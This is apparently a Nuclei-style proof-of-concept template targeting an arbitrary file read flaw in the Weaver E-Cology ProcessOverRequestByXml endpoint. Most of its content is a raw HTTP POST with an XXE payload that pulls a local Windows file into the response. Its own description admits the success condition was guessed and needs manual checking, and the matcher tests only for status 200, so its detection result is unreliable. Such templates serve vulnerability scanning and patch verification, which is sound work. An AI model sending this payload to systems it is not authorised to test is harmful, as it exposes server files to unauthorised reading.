id: poc-fzr3bs8p2o2qi9lz
info:
  name: 泛微E-Cology-ProcessOverRequestByXml接口处存在任意文件读取漏洞
  author: hacktwo
  severity: high
  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: lfi,2024
http:
- raw:
  - 'POST /rest/ofs/ProcessOverRequestByXml HTTP/1.1


    Host:127.0.0.1


    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36


    Content-Type: application/xml


    <?xml version="1.0" encoding="utf-8" ?><!DOCTYPE test[<!ENTITY test SYSTEM "file:///c:/windows/win.ini">]><reset><syscode>&test;</syscode></reset>'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
